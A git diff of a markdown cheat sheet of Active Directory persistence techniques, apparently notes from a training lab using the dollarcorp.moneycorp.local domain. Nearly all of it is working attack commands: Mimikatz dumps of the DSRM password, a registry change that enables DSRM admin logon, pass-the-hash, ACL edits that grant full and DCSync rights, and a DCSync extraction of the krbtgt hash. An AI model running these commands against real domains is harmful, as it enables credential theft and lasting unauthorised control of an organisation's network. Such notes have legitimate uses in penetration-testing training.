@@ -26,19 +26,20 @@ mimikatz # !
 ```
 ### DSRM (Directory Services Restore Mode)
 - There is a local admin on every DC called `Administrator` whose passwd is the DSRM passwd
+- Following steps need to be done in a DC session with DA rights
 ```powershell
-1. Dump DSRM password (DA privileges required)
+# 1. Dump DSRM password (DA privileges required)
 C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername <hostname>
 
-2. Compare the Administrator hash with the Admin hash of this command
+# (OPTIONAL) 2. Compare the Administrator hash with the Admin hash of this command
 C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <hostname>
 
-3. First one is the DSRM local Admin. Pass the hash can be used to authenticate
-4. Logon behavior for DSRM account needs to be changed
+# 3. First one is the DSRM local Admin. Pass the hash can be used to authenticate
+# 4. Logon behavior for DSRM account needs to be changed
 C:> Enter-PSSession -Computername <hostname> 
 C:> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 
-5. PAss the hash
+# 5. Pass the hash. FQDS domain and NTLM Hash obtained for Administrator in step 1.
 C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
 ```
 ### SSP (Security Support Provider)
@@ -89,9 +90,14 @@ C:> Set-DomainUserPassword -Identity <usernname> -AccountPassword (ConvertTo-Sec
 ```powershell
 # Add Full Rights to Domain Root ACL
 C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+- **DCSync**
+```powershell
+# Check if a user has DCSync rights. Gives nothing if no rights and
+C:> Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<user>"}
 
 # DCSync rights on Domain
-C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student76 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 
 # Execute DCSync
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
